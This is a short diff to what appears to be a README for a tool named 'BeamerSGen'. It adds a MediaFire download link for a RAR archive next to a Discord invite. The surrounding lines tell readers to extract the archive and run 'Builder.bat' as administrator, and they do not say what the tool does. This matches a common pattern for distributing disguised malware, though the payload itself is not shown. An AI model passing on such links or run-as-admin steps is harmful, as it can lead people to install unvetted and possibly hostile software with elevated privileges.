@@ -15,6 +15,9 @@
 > **>** Extract here `BeamerSGen.rar` **➙** Open as Adminstrator `Builder.bat`
 
 **DOWNLOAD**
+> https://www.mediafire.com/file/lssg6q4nt8glx1c/BeamerSGEN.rar/file
+
+**DISCORD**
 > https://discord.gg/gxy2eBPs
 
 **FUNCTION:**
